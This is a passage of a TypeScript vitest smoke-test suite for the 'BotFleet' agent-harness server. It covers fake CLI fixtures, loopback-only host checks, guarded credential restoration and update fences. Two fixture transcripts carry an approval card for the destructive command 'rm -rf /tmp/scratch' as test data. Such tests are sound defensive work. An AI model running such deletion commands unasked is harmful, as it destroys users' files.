// API smoke test: boots the real harness server (node server/index.ts)
// against a throwaway home directory and exercises the HTTP surface the
// app depends on. The config pins one deliberately-unknown driver so the
// suite is deterministic with or without agent CLIs installed — and pins
// the shadow-instance behavior end to end while it's at it.
import type { ChildProcess } from "node:child_process";
import { createServer, request, type Server } from "node:http";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { connect, type Socket } from "node:net";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { z } from "zod";

import { removeTempDir, spawnDetached, waitForExit } from "./testing/cleanup.ts";
import { openSse } from "./testing/sse.ts";
import { IMAGE_MAX_BYTES } from "./attachments.ts";
import { VPS_DEFAULT_CPUS, VPS_DEFAULT_MEMORY_GIB } from "./config.ts";
import { harnessReady } from "./testing/harness-ready.ts";

const SERVER_DIR = dirname(fileURLToPath(import.meta.url));
const ROOT = join(SERVER_DIR, "..");
const FAKE_CLAUDE_CLI = join(SERVER_DIR, "testing", "fake-claude-cli.ts");
const PORT = 18800 + Math.floor(Math.random() * 10_000);
const BASE = `http://127.0.0.1:${PORT}`;
const WEBHOOK_PORT = 39000 + Math.floor(Math.random() * 10_000);
const WEBHOOK_BASE = `http://127.0.0.1:${WEBHOOK_PORT}`;

let child: ChildProcess;
/** stands in for the box provider so config saving never touches the network */
let boxStub: Server;
let boxStubPort = 0;
let boxTurnGate: Promise<void> | null = null;
let releaseBoxTurnGate: (() => void) | null = null;
let boxTurnRequests = 0;
let home: string;
let staticDir: string;
let fakeClaudeDump: string;
/** wrapper CLI that always crashes before a result — drives a real failover */
let fakeCrashCli: string;
/** wrapper CLI that returns a successful-looking quota message */
let fakeQuotaCli: string;
/** wrapper CLI that returns ordinary prose containing former quota keywords */
let fakeQuotaProseCli: string;
/** successful subscription CLI that reports an API-equivalent cost */
let fakePricedClaudeCli: string;
/** quota CLI held behind a file gate so work can queue before completion */
let fakeGatedQuotaCli: string;
let fakeQuotaGate: string;
/** wrapper CLI whose version probe passes but strict-MCP help probe fails */
let fakeUnsupportedClaudeCli: string;
/** wrapper whose version probe can be held so fallback health stays pending */
let fakeSlowProbeCli: string;
let fakeSlowProbeGate: string;
let fakeSlowProbeStarted: string;
/** stands in for a host's `recall` CLI; its behaviour is switched per test
 * by writing a mode into ~/.botfleet/fake-recall-mode */
let fakeRecallCli: string;
let stderr = "";

const api = async (method: string, path: string, body?: unknown): Promise<{ status: number; body: any }> => {
  const res = await fetch(`${BASE}${path}`, {
    method,
    headers: body ? { "content-type": "application/json" } : undefined,
    body: body ? JSON.stringify(body) : undefined,
  });
  return { status: res.status, body: await res.json() };
};

const uploadAvatar = async (mime = "image/png"): Promise<string> => {
  const response = await fetch(`${BASE}/api/attachments`, {
    method: "POST",
    headers: { "content-type": mime },
    body: new Uint8Array([0x89, 0x50, 0x4e, 0x47]),
  });
  expect(response.status).toBe(201);
  const saved = (await response.json()) as { path: string };
  const name = saved.path.replaceAll("\\", "/").split("/").pop();
  if (!name) throw new Error("attachment response did not include a filename");
  return `/api/attachments/${name}`;
};

const connectSocket = (path: string): Promise<Socket> => new Promise((resolve, reject) => {
  let retriesLeft = 40;
  const tryConnect = () => {
    const socket = connect(path);
    const onConnect = () => {
      socket.removeListener("error", onError);
      resolve(socket);
    };
    const onError = (error: NodeJS.ErrnoException) => {
      socket.removeListener("connect", onConnect);
      socket.destroy();
      if (error.code === "ENOENT" && retriesLeft-- > 0) return void setTimeout(tryConnect, 25);
      reject(error);
    };
    socket.once("connect", onConnect);
    socket.once("error", onError);
  };
  tryConnect();
});

const statusWithHeaders = (headers: Record<string, string>): Promise<number> =>
  new Promise((resolve, reject) => {
    const req = request({ hostname: "127.0.0.1", port: PORT, path: "/api/health", headers }, (res) => {
      res.resume();
      resolve(res.statusCode ?? 0);
    });
    req.on("error", reject);
    req.end();
  });

const writeFakeClaudeWrapper = (
  file: string,
  mode: "exit-early" | "hang" | "happy" | "quota",
  options: { keepDump?: boolean; quotaGate?: string; launchLog?: string; replyText?: string } = {},
): string => {
  const lines = [
    "#!/usr/bin/env node",
    `process.env.FAKE_CLAUDE_MODE = ${JSON.stringify(mode)};`,
  ];
  if (options.launchLog) {
    lines.push(
      'const { appendFileSync } = await import("node:fs");',
      `if (!["--version", "--help", "auth"].includes(process.argv[2])) appendFileSync(${JSON.stringify(options.launchLog)}, "launch\\n");`,
    );
  }
  if (!options.keepDump) lines.push("delete process.env.FAKE_CLAUDE_DUMP;");
  if (options.quotaGate) {
    lines.push(`process.env.FAKE_CLAUDE_QUOTA_GATE = ${JSON.stringify(options.quotaGate)};`);
  }
  if (options.replyText) {
    lines.push(`process.env.FAKE_CLAUDE_REPLY = ${JSON.stringify(options.replyText)};`);
  }
  lines.push(`await import(${JSON.stringify(pathToFileURL(FAKE_CLAUDE_CLI).href)});`, "");
  writeFileSync(file, lines.join("\n"), { mode: 0o755 });
  return file;
};

beforeAll(async () => {
  home = mkdtempSync(join(tmpdir(), "omb-api-test-"));
  staticDir = join(home, "static");
  fakeClaudeDump = join(home, "fake-claude-dump.json");
  // A third engine whose CLI always crashes before producing a result. The
  // suite pins FAKE_CLAUDE_MODE=hang process-wide, so the only way to get one
  // instance to FAIL — and thus make a bot genuinely fail over onto another
  // instance — is to override the mode per CLI. FAKE_CLAUDE_DUMP is dropped
  // so this engine never clobbers the argv dump other tests assert on.
  fakeCrashCli = writeFakeClaudeWrapper(join(home, "fake-claude-crash"), "exit-early");
  fakeQuotaCli = writeFakeClaudeWrapper(join(home, "fake-claude-quota"), "quota");
  fakeQuotaProseCli = writeFakeClaudeWrapper(join(home, "fake-claude-quota-prose"), "happy", {
    replyText: "The subscription accounting review is complete.",
  });
  fakePricedClaudeCli = join(home, "fake-claude-priced");
  writeFileSync(
    fakePricedClaudeCli,
    [
      "#!/usr/bin/env node",
      "delete process.env.FAKE_CLAUDE_MODE;",
      "delete process.env.FAKE_CLAUDE_DUMP;",
      `await import(${JSON.stringify(pathToFileURL(FAKE_CLAUDE_CLI).href)});`,
      "",
    ].join("\n"),
    { mode: 0o755 },
  );
  fakeQuotaGate = join(home, "fake-quota-gate");
  fakeGatedQuotaCli = writeFakeClaudeWrapper(
    join(home, "fake-claude-gated-quota"),
    "quota",
    { keepDump: true, quotaGate: fakeQuotaGate },
  );
  fakeUnsupportedClaudeCli = join(home, "fake-claude-unsupported");
  writeFileSync(
    fakeUnsupportedClaudeCli,
    [
      "#!/usr/bin/env node",
      'process.env.FAKE_CLAUDE_HELP = "unsupported";',
      `await import(${JSON.stringify(pathToFileURL(FAKE_CLAUDE_CLI).href)});`,
      "",
    ].join("\n"),
    { mode: 0o755 },
  );
  fakeSlowProbeCli = join(home, "fake-claude-slow-probe");
  fakeSlowProbeGate = join(home, "fake-slow-probe-gate");
  fakeSlowProbeStarted = join(home, "fake-slow-probe-started");
  writeFileSync(fakeSlowProbeGate, "release");
  writeFileSync(
    fakeSlowProbeCli,
    [
      "#!/usr/bin/env node",
      'const { appendFileSync, existsSync } = await import("node:fs");',
      `if (process.argv[2] === "--version" && !existsSync(${JSON.stringify(fakeSlowProbeGate)})) {`,
      `  appendFileSync(${JSON.stringify(fakeSlowProbeStarted)}, "probe\\n");`,
      `  while (!existsSync(${JSON.stringify(fakeSlowProbeGate)})) await new Promise((resolve) => setTimeout(resolve, 10));`,
      "}",
      "delete process.env.FAKE_CLAUDE_DUMP;",
      `await import(${JSON.stringify(pathToFileURL(FAKE_CLAUDE_CLI).href)});`,
      "",
    ].join("\n"),
    { mode: 0o755 },
  );
  // A stand-in for the operator's `recall` CLI.  "slow" sleeps past the old
  // 6s probe ceiling on purpose — that ceiling was under the real command's
  // measured cost, so a healthy corpus timed out on every single probe.
  fakeRecallCli = join(home, "fake-recall");
  writeFileSync(
    fakeRecallCli,
    [
      "#!/bin/sh",
      'mode=$(cat "$HOME/.botfleet/fake-recall-mode" 2>/dev/null || echo ok)',
      'stats=\'{"collection":"fake-corpus","points":42,"embedder_healthy":true,"status":"green"}\'',
      'case "$mode" in',
      "  slow) sleep 7; echo \"$stats\" ;;",
      '  fail) echo "recall: could not reach the embedder" >&2; exit 3 ;;',
      '  *) echo "$stats" ;;',
      "esac",
      "",
    ].join("\n"),
    { mode: 0o755 },
  );
  // a fleet of exactly one unknown driver: no CLI probes, no network
  mkdirSync(join(home, ".botfleet"), { recursive: true });
  mkdirSync(join(staticDir, "assets"), { recursive: true });
  writeFileSync(join(staticDir, "index.html"), "<!doctype html><title>Packaged BotFleet</title>");
  writeFileSync(join(staticDir, "assets", "smoke.css"), "body { color: white; }");
  writeFileSync(
    join(home, ".botfleet", "config.json"),
    JSON.stringify({
      instances: {
        ghost: { driver: "not-a-real-driver", displayName: "Ghost" },
        claude: { driver: "claudeAgent", displayName: "Fixture Claude", config: { cli: FAKE_CLAUDE_CLI } },
        // A SECOND live instance, so a fallback chain has a real cross-instance
        // target.  That is the case the stop bug hid in: after a failover the
        // bot record still names the original instance, so resolving one
        // adapter from bot.modelSelection stops the wrong engine.
        claude2: { driver: "claudeAgent", displayName: "Fixture Claude Two", config: { cli: FAKE_CLAUDE_CLI } },
        crasher: { driver: "claudeAgent", displayName: "Fixture Crasher", config: { cli: fakeCrashCli } },
        quota: { driver: "claudeAgent", displayName: "Fixture Quota", enabled: false, config: { cli: fakeQuotaCli } },
        quotaProse: { driver: "claudeAgent", displayName: "Fixture Quota Prose", enabled: false, config: { cli: fakeQuotaProseCli } },
        pricedClaude: { driver: "claudeAgent", displayName: "Fixture Priced Claude", enabled: false, config: { cli: fakePricedClaudeCli } },
        gatedQuota: { driver: "claudeAgent", displayName: "Fixture Gated Quota", enabled: false, config: { cli: fakeGatedQuotaCli } },
        slowProbe: { driver: "claudeAgent", displayName: "Fixture Slow Probe", enabled: false, config: { cli: fakeSlowProbeCli } },
      },
    }),
  );
  writeFileSync(
    join(home, ".botfleet", "groups.json"),
    JSON.stringify([
      {
        id: "test-dm",
        threadId: "test-dm-thread",
        name: "Private channel",
        memberIds: ["test-bot-a", "test-bot-b"],
        defaultResponder: { kind: "mentions" },
        bulletin: "",
        unread: false,
        createdAt: 1,
        dm: true,
      },
      {
        id: "test-stranded-room",
        threadId: "test-stranded-room-thread",
        name: "Stranded room",
        memberIds: ["test-bot-a"],
        defaultResponder: { kind: "member", botId: "test-bot-a" },
        bulletin: "",
        unread: false,
        createdAt: 3,
      },
      {
        id: "test-cancel-room",
        threadId: "test-cancel-room-thread",
        name: "Cancel room",
        memberIds: ["test-bot-a"],
        defaultResponder: { kind: "member", botId: "test-bot-a" },
        bulletin: "",
        unread: false,
        createdAt: 4,
      },
      {
        id: "test-pinned-room",
        threadId: "test-pinned-room-thread",
        name: "Pinned room",
        memberIds: ["test-bot-a"],
        defaultResponder: { kind: "member", botId: "test-bot-a" },
        bulletin: "",
        unread: false,
        createdAt: 2,
        pinnedCwd: null,
      },
    ]),
  );

  // A room transcript carrying an approval that outlived its turn: the card
  // is durable, but busyBotId is in-memory only and never survives a restart.
  writeFileSync(
    join(home, ".botfleet", "messages-test-stranded-room-thread.json"),
    JSON.stringify({
      activeLeafId: "stranded-card",
      messages: [
        {
          id: "stranded-card",
          at: 3,
          parentId: null,
          role: "bot",
          kind: "options",
          card: {
            title: "Approval needed",
            subtitle: "rm -rf /tmp/scratch",
            options: ["Allow", "Deny"],
            requestId: "stranded-request",
            tool: "Bash",
            allowKey: "Bash:rm",
          },
          from: { botId: "test-bot-a", name: "Test bot A", color: "purple" },
        },
      ],
    }),
  );

  // A room holding an approval nobody has answered yet, so "Cancel turn"
  // has something open to close.
  writeFileSync(
    join(home, ".botfleet", "messages-test-cancel-room-thread.json"),
    JSON.stringify({
      activeLeafId: "cancel-card",
      messages: [
        {
          id: "cancel-card",
          at: 4,
          parentId: null,
          role: "bot",
          kind: "options",
          card: {
            title: "Approval needed",
            subtitle: "rm -rf /tmp/scratch",
            options: ["Allow", "Deny"],
            requestId: "cancel-request",
            tool: "Bash",
            allowKey: "Bash:rm",
          },
          from: { botId: "test-bot-a", name: "Test bot A", color: "purple" },
        },
      ],
    }),
  );

  boxStub = createServer(async (req, res) => {
    if (req.url?.startsWith("/api/v3.1/tool_router/session")) {
      if (req.headers["x-api-key"] !== "ak_good") {
        res.writeHead(401, { "content-type": "application/json" });
        return res.end(JSON.stringify({ error: { message: "invalid project key" } }));
      }
      let raw = "";
      for await (const chunk of req) raw += chunk;
      const body = raw ? JSON.parse(raw) : {};
      res.writeHead(201, { "content-type": "application/json" });
      return res.end(JSON.stringify({
        session_id: "trs_config_test",
        mcp: { type: "http", url: "https://app.composio.dev/tool_router/v3/trs_config_test/mcp" },
        config: { user_id: body.user_id },
      }));
    }
    if (req.headers.authorization === "Bearer box_gate" && boxTurnGate) {
      boxTurnRequests += 1;
      await boxTurnGate;
    } else if (req.headers.authorization === "Bearer box_slow") {
      await new Promise((resolve) => setTimeout(resolve, 150));
    }
    const ok =
      req.headers.authorization === "Bearer box_good" ||
      req.headers.authorization === "Bearer box_slow" ||
      req.headers.authorization === "Bearer box_gate";
    res.writeHead(ok ? 200 : 401, { "content-type": "application/json" });
    res.end(JSON.stringify(ok ? { ok: true, boxes: [] } : { ok: false, code: "unauthorized" }));
  });
  await new Promise<void>((r) => boxStub.listen(0, "127.0.0.1", r));
  boxStubPort = (boxStub.address() as { port: number }).port;

  child = spawnDetached(process.execPath, [join(SERVER_DIR, "index.ts")], {
    cwd: ROOT,
    env: {
      ...(process.env.PATH ? { PATH: process.env.PATH } : {}),
      ...(process.env.SystemRoot ? { SystemRoot: process.env.SystemRoot } : {}),
      HOME: home,
      USERPROFILE: home,
      OMB_PORT: String(PORT),
      OMB_WEBHOOK_PORT: String(WEBHOOK_PORT),
      OMB_BOX_API: `http://127.0.0.1:${boxStubPort}`,
      OMB_COMPOSIO_API: `http://127.0.0.1:${boxStubPort}/api/v3.1`,
      OMB_STATIC_DIR: staticDir,
      FAKE_CLAUDE_MODE: "hang",
      FAKE_CLAUDE_DUMP: fakeClaudeDump,
      RECALL_CLI_PATH: fakeRecallCli,
      OMB_DISABLE_ANTIGRAVITY_QUOTA: "1",
    },
    stdio: ["ignore", "pipe", "pipe"],
  });
  child.stderr!.on("data", (c) => (stderr += c));

  const deadline = Date.now() + 45_000;
  for (;;) {
    try {
      if (await harnessReady(BASE)) break;
    } catch {
      /* not up yet */
    }
    if (Date.now() > deadline) throw new Error(`server never came up. stderr:\n${stderr}`);
    if (child.exitCode !== null) throw new Error(`server exited ${child.exitCode}. stderr:\n${stderr}`);
    await new Promise((r) => setTimeout(r, 150));
  }
  const boot = await api("GET", "/api/config");
  if (boot.body.conversationMode !== "simple") {
    throw new Error(`fresh home should default to simple, got ${String(boot.body.conversationMode)}`);
  }
  const solo = await api("POST", "/api/bots");
  const blocked = await api("POST", `/api/bots/${solo.body.bot.id}/tasks`, { title: "Side work" });
  if (blocked.status !== 409) {
    throw new Error(`simple mode should refuse extra conversations, got ${blocked.status}`);
  }
  const empty = await api("PATCH", "/api/conversation-mode", {});
  if (empty.status !== 400) throw new Error("empty conversation-mode patch should 400");
  const unknown = await api("PATCH", "/api/conversation-mode", { conversationMode: "threads" });
  if (unknown.status !== 400) throw new Error("unknown conversation-mode should 400");
  const asFleet = await api("PATCH", "/api/conversation-mode", { conversationMode: "fleet" });
  if (asFleet.status !== 200 || asFleet.body.conversationMode !== "projects") {
    throw new Error("leftover fleet should read as projects");
  }
  // The rest of this file exercises extra conversations, so stay in Projects.
}, 60_000);

  it("merges extra threads when switching to Simple with mergeThreads", async () => {
    const created = await api("POST", "/api/bots");
    const bot = created.body.bot;
    const extra = await api("POST", `/api/bots/${bot.id}/tasks`, { title: "Side work" });
    expect(extra.status).toBe(201);
    expect(extra.body.bot.tasks.length).toBeGreaterThan(1);

    const merged = await api("PATCH", "/api/conversation-mode", {
      conversationMode: "simple",
      mergeThreads: true,
    });
    expect(merged.status).toBe(200);
    expect(merged.body.conversationMode).toBe("simple");

    const after = await api("GET", "/api/bots");
    const fresh = after.body.bots.find((candidate: { id: string }) => candidate.id === bot.id);
    expect(fresh.tasks).toHaveLength(1);

    const back = await api("PATCH", "/api/conversation-mode", { conversationMode: "projects" });
    expect(back.status).toBe(200);
    expect(back.body.conversationMode).toBe("projects");
  });

afterAll(async () => {
  boxStub?.close();
  // Upstream fixed this same Linux scratch-cleanup flake with an inline
  // retry loop; these helpers are that fix plus the cause — the retry AND
  // an exit that is actually waited for before the delete begins.
  await waitForExit(child, { signal: "SIGTERM" });
  await removeTempDir(home);
});

describe("harness HTTP API", () => {
  it("restores encrypted workspace credentials only through authenticated runtime memory", async () => {
    const owner = JSON.parse(readFileSync(join(home, ".botfleet", "harness-owner.json"), "utf8"));
    const restore = (body: unknown, nonce = owner.nonce) => fetch(`${BASE}/api/runtime/credentials`, {
      method: "POST", headers: { "content-type": "application/json", authorization: `Bearer ${nonce}` },
      body: JSON.stringify(body),
    });
    const configPath = join(home, ".botfleet", "config.json");
    const before = readFileSync(configPath, "utf8");
    expect((await restore({ xaiApiKey: "restore-sentinel" }, "wrong-owner")).status).toBe(401);
    expect((await restore({ PATH: "forbidden" })).status).toBe(400);
    expect(readFileSync(configPath, "utf8")).toBe(before);
    try {
      const response = await restore({ xaiApiKey: "restore-sentinel" });
      expect(response.status).toBe(200);
      expect(await response.json()).toEqual({ restored: ["xaiApiKey"], retained: [] });
      expect((await api("GET", "/api/config")).body.xai.configured).toBe(true);
      expect(readFileSync(configPath, "utf8")).toBe(before);
      const repeated = await restore({ xaiApiKey: "older-sentinel" });
      expect(await repeated.json()).toEqual({ restored: [], retained: ["xaiApiKey"] });
      expect(readFileSync(configPath, "utf8")).toBe(before);
      expect(stderr).not.toContain("restore-sentinel");
    } finally {
      await api("PUT", "/api/config?secretStorage=external", { xai: { key: "" } });
    }
  });

  it("refuses workspace credential restoration without interrupting active work", async () => {
    const owner = JSON.parse(readFileSync(join(home, ".botfleet", "harness-owner.json"), "utf8"));
    const claude = (await api("GET", "/api/instances")).body.instances.find((i: { instanceId: string }) => i.instanceId === "claude");
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      await api("PATCH", `/api/bots/${bot.id}`, { modelSelection: { instanceId: "claude", model: claude.models.default } });
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "hold this fixture turn" })).status).toBe(202);
      await expect.poll(async () => (await api("GET", "/api/bots?messages=0")).body.bots.find((b: { id: string }) => b.id === bot.id)?.busy).toBe(true);
      const before = readFileSync(join(home, ".botfleet", "config.json"), "utf8");
      const response = await fetch(`${BASE}/api/runtime/credentials`, { method: "POST",
        headers: { "content-type": "application/json", authorization: `Bearer ${owner.nonce}` },
        body: JSON.stringify({ deepseekApiKey: "busy-sentinel" }) });
      expect(response.status).toBe(409);
      expect((await api("GET", "/api/config")).body.deepseek.configured).toBe(false);
      expect((await api("GET", "/api/bots?messages=0")).body.bots.find((b: { id: string }) => b.id === bot.id)?.busy).toBe(true);
      expect(readFileSync(join(home, ".botfleet", "config.json"), "utf8")).toBe(before);
    } finally {
      await api("POST", `/api/bots/${bot.id}/interrupt`, { threadId: bot.threadId });
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("counts other admissions and respects the update fence during workspace credential restoration", async () => {
    const owner = JSON.parse(readFileSync(join(home, ".botfleet", "harness-owner.json"), "utf8"));
    const authorization = { authorization: `Bearer ${owner.nonce}` };
    const created = await api("POST", "/api/instances", { name: "Admission restore", endpoint: "http://localhost:11498/v1", models: ["fixture"] });
    expect(created.status).toBe(201);
    const id = created.body.instanceId;
    const held = request({ hostname: "127.0.0.1", port: PORT, path: "/api/runtime/credentials", method: "POST",
      headers: { ...authorization, "content-type": "application/json", "content-length": "2" } });
    held.on("error", () => {});
    held.write("{");
    const restore = (path: string, body: unknown) => fetch(`${BASE}${path}`, {
      method: path.includes("instances") ? "PATCH" : "POST", headers: { ...authorization, "content-type": "application/json" }, body: JSON.stringify(body),
    });
    const runtime = async () => (await fetch(`${BASE}/api/runtime`, { headers: authorization })).json() as Promise<{ activeWorkCount: number }>;
    try {
      await expect.poll(async () => (await runtime()).activeWorkCount).toBe(1);
      expect((await restore("/api/runtime/credentials", { deepseekApiKey: "blocked-sentinel" })).status).toBe(409);
      expect((await restore(`/api/instances/${id}?restore=1`, { key: "blocked-custom" })).status).toBe(409);
      expect((await fetch(`${BASE}/api/runtime/quiesce`, { method: "POST", headers: authorization })).status).toBe(409);
      held.destroy();
      await expect.poll(async () => (await runtime()).activeWorkCount).toBe(0);
      expect((await fetch(`${BASE}/api/runtime/quiesce`, { method: "POST", headers: authorization })).status).toBe(200);
      expect((await restore("/api/runtime/credentials", { deepseekApiKey: "blocked-sentinel" })).status).toBe(503);
      expect((await restore(`/api/instances/${id}?restore=1`, { key: "blocked-custom" })).status).toBe(503);
    } finally {
      held.destroy();
      await fetch(`${BASE}/api/runtime/quiesce`, { method: "DELETE", headers: authorization });
      await api("DELETE", `/api/instances/${id}`);
    }
  });

  it("restores encrypted custom credentials only when idle without writing config or replacing a current key", async () => {
    const owner = JSON.parse(readFileSync(join(home, ".botfleet", "harness-owner.json"), "utf8"));
    const created = await api("POST", "/api/instances", { name: "Restore fixture", endpoint: "http://localhost:11498/v1", models: ["fixture"] });
    expect(created.status).toBe(201);
    const id = created.body.instanceId;
    const restore = (body: unknown, nonce = owner.nonce, instanceId = id) => fetch(`${BASE}/api/instances/${instanceId}?secretStorage=external&restore=1`, {
      method: "PATCH", headers: { "content-type": "application/json", authorization: `Bearer ${nonce}` }, body: JSON.stringify(body),
    });
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      const claude = (await api("GET", "/api/instances")).body.instances.find((i: { instanceId: string }) => i.instanceId === "claude");
      await api("PATCH", `/api/bots/${bot.id}`, { modelSelection: { instanceId: "claude", model: claude.models.default } });
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "hold this custom restore fixture" })).status).toBe(202);
      await expect.poll(async () => (await api("GET", "/api/bots?messages=0")).body.bots.find((b: { id: string }) => b.id === bot.id)?.busy).toBe(true);
      const configPath = join(home, ".botfleet", "config.json");
      const before = readFileSync(configPath, "utf8");
      expect((await restore({ key: "custom-restore-sentinel" }, "wrong-owner")).status).toBe(401);
      expect((await restore({ key: "custom-restore-sentinel" }, owner.nonce, "missing-instance")).status).toBe(404);
      expect((await restore({ key: "custom-restore-sentinel", ignored: true })).status).toBe(400);
      expect((await restore({ key: "custom-restore-sentinel" })).status).toBe(409);
      expect((await api("GET", "/api/bots?messages=0")).body.bots.find((b: { id: string }) => b.id === bot.id)?.busy).toBe(true);
      expect(readFileSync(configPath, "utf8")).toBe(before);
      await api("POST", `/api/bots/${bot.id}/interrupt`, { threadId: bot.threadId });
      await expect.poll(async () => (await api("GET", "/api/bots?messages=0")).body.bots.find((b: { id: string }) => b.id === bot.id)?.busy).toBe(false);
      const restored = await restore({ key: "custom-restore-sentinel" });
      expect(restored.status).toBe(200);
      expect(await restored.json()).toEqual({ restored: true });
      expect(await (await restore({ key: "older-copy" })).json()).toEqual({ retained: true });
      expect(readFileSync(configPath, "utf8")).toBe(before);
      expect(stderr).not.toContain("custom-restore-sentinel");
    } finally {
      await api("POST", `/api/bots/${bot.id}/interrupt`, { threadId: bot.threadId });
      await api("DELETE", `/api/bots/${bot.id}`);
      await api("DELETE", `/api/instances/${id}`);
    }
  });

  it("rejects non-loopback authorities while accepting IPv4 and IPv6 loopback forms", async () => {
    expect(await statusWithHeaders({ host: "example.com" })).toBe(403);
    expect(await statusWithHeaders({ origin: "https://example.com" })).toBe(403);
    expect(await statusWithHeaders({ host: `127.0.0.2:${PORT}` })).toBe(200);
    expect(await statusWithHeaders({ host: `[::1]:${PORT}` })).toBe(200);
    expect(await statusWithHeaders({ origin: `http://[::1]:${PORT}` })).toBe(200);
  });

  it("identifies itself on /api/health", async () => {
    const { status, body } = await api("GET", "/api/health");
    expect(status).toBe(200);
    expect(body.app).toBe("botfleet");
    expect(typeof body.pid).toBe("number");
    expect(body.static).toBe(true);
  });

  it("authenticates a reversible runtime admission fence", async () => {
    const owner = JSON.parse(readFileSync(join(home, ".botfleet", "harness-owner.json"), "utf8")) as { nonce: string };
    const unauthorized = await fetch(`${BASE}/api/runtime/quiesce`, { method: "POST" });
    expect(unauthorized.status).toBe(401);

    const authorization = { Authorization: `Bearer ${owner.nonce}` };
    const heldMutation = request({
      hostname: "127.0.0.1",
      port: PORT,
      path: "/api/config",
      method: "PUT",
      headers: { "content-type": "application/json", "content-length": "2" },
    });
    heldMutation.on("error", () => {});
    heldMutation.write("{");
    await new Promise((resolve) => setTimeout(resolve, 30));
    const blockedFence = await fetch(`${BASE}/api/runtime/quiesce`, { method: "POST", headers: authorization });
    expect(blockedFence.status).toBe(409);
    expect(await blockedFence.json()).toMatchObject({ safeToRestart: false, activeWorkCount: 1, quiescing: false });
    heldMutation.destroy();

    let fenced: Response | undefined;
    for (let attempt = 0; attempt < 20; attempt += 1) {
      fenced = await fetch(`${BASE}/api/runtime/quiesce`, { method: "POST", headers: authorization });
      if (fenced.status === 200) break;
      await fenced.arrayBuffer();
      await new Promise((resolve) => setTimeout(resolve, 25));
    }
    expect(fenced).toBeDefined();
    if (!fenced) throw new Error("runtime admission fence did not answer");
    expect(fenced.status).toBe(200);
    expect(await fenced.json()).toMatchObject({ safeToRestart: true, activeWorkCount: 0, quiescing: true });
    try {
      const refused = await fetch(`${BASE}/api/config`);
      expect(refused.status).toBe(503);
      expect(await refused.json()).toEqual({ error: "BotFleet is quiescing for an update" });
    } finally {
      const released = await fetch(`${BASE}/api/runtime/quiesce`, { method: "DELETE", headers: authorization });
      expect(released.status).toBe(200);
      expect(await released.json()).toMatchObject({ quiescing: false });
    }
    expect((await fetch(`${BASE}/api/config`)).status).toBe(200);
  });

  it("serves packaged UI assets and preserves API 404s", async () => {
    const root = await fetch(`${BASE}/`);
    expect(root.status).toBe(200);
    expect(root.headers.get("content-type")).toBe("text/html");
    expect(await root.text()).toContain("Packaged BotFleet");

    const asset = await fetch(`${BASE}/assets/smoke.css`);
    expect(asset.status).toBe(200);
    expect(asset.headers.get("content-type")).toBe("text/css");
    expect(await asset.text()).toContain("color: white");

    const spa = await fetch(`${BASE}/settings/desktop`);
    expect(spa.status).toBe(200);
    expect(spa.headers.get("content-type")).toBe("text/html");
    expect(await spa.text()).toContain("Packaged BotFleet");

    const unknownApi = await api("GET", "/api/not-a-real-route");
    expect(unknownApi.status).toBe(404);
    expect(unknownApi.body.error).toContain("/api/not-a-real-route");
  });

  it("rejects malformed and oversized JSON bodies without hanging", async () => {
    const malformed = await fetch(`${BASE}/api/config`, {
      method: "PUT",
      headers: { "content-type": "application/json" },
      body: "{",
    });
    expect(malformed.status).toBe(400);
    expect(await malformed.json()).toEqual({ error: "invalid JSON body" });

    const oversized = await fetch(`${BASE}/api/config`, {
      method: "PUT",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ profile: { name: "x".repeat(1_000_001) } }),
    });
    expect(oversized.status).toBe(413);
    expect(await oversized.json()).toEqual({ error: "body too large" });

    expect((await fetch(`${BASE}/api/health`)).status).toBe(200);
  });

  it("seeds one starter bot with its greeting", async () => {
    const { status, body } = await api("GET", "/api/bots");
    expect(status).toBe(200);
    expect(body.bots.length).toBeGreaterThanOrEqual(1);
    if (body.bots[0].messages.length < 2) console.log("MESSAGES:", body.bots[0].messages); expect(body.bots[0].messages.length).toBeGreaterThanOrEqual(2);
  });

  it("projects privacy-safe live team-map metadata", async () => {
    const response = await api("GET", "/api/team-map");
    expect(response.status).toBe(200);
    expect(response.body).toMatchObject({ collaborations: expect.any(Array), queued: [], running: [] });
    for (const collaboration of response.body.collaborations) {
      expect(collaboration).toEqual({
        groupId: expect.any(String),
        botIds: [expect.any(String), expect.any(String)],
        lastAt: expect.any(Number),
      });
    }
    expect(JSON.stringify(response.body)).not.toContain("messages");
    expect(JSON.stringify(response.body)).not.toContain("prompt");
  });

  it("rejects non-object bot and channel create bodies without writing records", async () => {
    const before = await api("GET", "/api/bots?messages=0");
    for (const path of ["/api/bots", "/api/groups"]) {
      for (const body of ["null", "[]"]) {
        const response = await fetch(`${BASE}${path}`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body,
        });
        expect(response.status).toBe(400);
        expect(await response.json()).toMatchObject({ error: expect.stringMatching(/JSON object/) });
      }
    }
    const after = await api("GET", "/api/bots?messages=0");
    expect(after.body.bots).toHaveLength(before.body.bots.length);
    expect(after.body.groups).toHaveLength(before.body.groups.length);
  });

  it("adds and removes room members through PATCH", async () => {
    const [first, second, third] = await Promise.all([
      api("POST", "/api/bots"),
      api("POST", "/api/bots"),
      api("POST", "/api/bots"),
    ]).then((created) => created.map((response) => response.body.bot));
    const room = (await api("POST", "/api/groups", { name: "Roster", memberIds: [first.id, second.id] })).body.group;
    try {
      const added = await api("PATCH", `/api/groups/${room.id}`, { memberIds: [first.id, second.id, third.id] });
      expect(added.status).toBe(200);
      expect(added.body.group.memberIds).toEqual([first.id, second.id, third.id]);

      const removed = await api("PATCH", `/api/groups/${room.id}`, { memberIds: [third.id] });
      expect(removed.status).toBe(200);
      expect(removed.body.group.memberIds).toEqual([third.id]);

      const state = (await api("GET", "/api/bots")).body;
      expect(state.groups.find((group: { id: string }) => group.id === room.id).memberIds).toEqual([third.id]);
    } finally {
      await api("DELETE", `/api/groups/${room.id}`);
      for (const bot of [first, second, third]) await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("persists room avatarCrop the same way bot avatars do", async () => {
